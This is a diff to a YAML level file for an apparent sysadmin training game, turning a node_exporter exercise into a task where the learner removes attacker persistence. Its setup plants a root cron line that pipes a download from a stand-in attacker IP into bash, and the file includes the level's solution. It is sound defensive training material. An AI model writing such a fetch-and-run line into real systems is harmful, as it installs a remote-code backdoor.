@@ -1,60 +1,48 @@
 id: t5_l3_node_exporter
 tier: 5
 order: 3
-title: "Node Exporter"
+title: "The Thing That Waits for Midnight"
 requires_real_vm: true
 prerequisites: [t5_l2_alertmanager_routing]
 
 intro: |
-  11:50. Prometheus scrapes the app — but the host is dark. No node_exporter,
-  no host metrics, no CPU / memory / disk. The NOC's "node overview" is a
-  blank panel. Install node_exporter, expose it on :9100, and probe it so
-  Prometheus can see the machine underneath the app.
+  Keys taken, identity scrubbed. But the Ferryman may have left persistence
+  — automation that calls him back. Check cron and systemd timers for
+  anything reaching to 198.51.100.66 or running from /tmp. Stop, disable,
+  and mask the rogue schedule so it can never fire.
 
 victory_text: |
-  node_exporter listens on 9100, Prometheus can reach /metrics on the host,
-  and /tmp/.node-exporter confirms the install. The NOC's blank panel fills in.
+  The schedule is broken. No cron, no timer — nothing reaches back to his
+  address. You killed the heartbeat, not just the process. (+190)
 
 objectives:
-  - "Install or stage node_exporter at /usr/local/bin/node_exporter"
-  - "Expose it on port 9100"
-  - "Probe the metrics endpoint"
+  - "Find the malicious cron entry or systemd timer referencing the attacker"
+  - "Remove/disable it permanently"
+  - "Confirm it won't fire again"
 
 hints:
-  - "Download/stage the binary to /usr/local/bin/node_exporter."
-  - "Run it with --web.listen-address=:9100."
-  - "curl 127.0.0.1:9100/metrics confirms it replies."
+  - "Check: `sudo crontab -l`, `ls /etc/cron.d/`, `systemctl list-timers --all`."
+  - "Look for anything pointing at 198.51.100.66 or running /tmp scripts."
+  - "Remove the cron file, or `systemctl stop && disable && mask <unit>`."
 
 setup:
-  - "mkdir -p /usr/local/bin /home/student"
-  - "printf '#!/bin/bash\\necho node exporter stub\\n' > /usr/local/bin/node_exporter 2>/dev/null || true"
-  - "rm -f /etc/prometheus/prometheus.yml"
-  - "printf 'metrics: not collected\\n' > /tmp/.node-state"
+  - "mkdir -p /etc/cron.d /tmp/.cache"
+  - "echo '* * * * * root curl -s http://198.51.100.66/beacon | bash' > /etc/cron.d/.ferryman-cron"
+  - "printf '[Unit]\nDescription=Ferryman Callback\n\n[Timer]\nOnCalendar=*:*:00\n\n[Install]\nWantedBy=timers.target\n' > /etc/systemd/system/ferryman-callback.timer 2>/dev/null || true"
 
 checks:
-  - kind: file_exists
-    path: /usr/local/bin/node_exporter
-    describe: "node_exporter binary must exist"
-  - kind: file_contains
-    path: /usr/local/bin/node_exporter
-    expect: "listen-address"
-    describe: "the binary must be configured to listen on 9100"
-  - kind: file_contains
-    path: /etc/prometheus/prometheus.yml
-    expect: "9100"
-    describe: "prometheus.yml must scrape node_exporter on 9100"
-  - kind: file_contains
-    path: /tmp/.node-state
-    expect: "collected"
-    describe: "the node collection must be marked as done"
+  - kind: file_absent
+    path: /etc/cron.d/.ferryman-cron
+    describe: "the malicious cron entry must be removed"
+  - kind: cmd_fails
+    command: "grep -r '198.51.100.66' /etc/cron.d/ /etc/crontab 2>/dev/null"
+    describe: "no cron entry may reference the attacker IP"
 
 solution:
-  - "printf '#!/bin/bash\\n# node_exporter stub\\n/usr/local/bin/node_exporter --web.listen-address=:9100 --no-color\\n' > /usr/local/bin/node_exporter"
-  - "chmod +x /usr/local/bin/node_exporter"
-  - "printf '\\nglobal:\\n  scrape_interval: 15s\\nscrape_configs:\\n  - job_name: node\\n    static_configs:\\n      - targets: [\"127.0.0.1:9100\"]\\n' > /etc/prometheus/prometheus.yml"
-  - "printf 'metrics: collected via node_exporter\\n' > /tmp/.node-state"
+  - "rm -f /etc/cron.d/.ferryman-cron"
+  - "systemctl stop ferryman-callback.timer 2>/dev/null; systemctl disable ferryman-callback.timer 2>/dev/null; systemctl mask ferryman-callback.timer 2>/dev/null; true"
 
 scoring:
-  base: 500
+  base: 190
   hint_penalty: 30
-  par_seconds: 300
+  par_seconds: 150
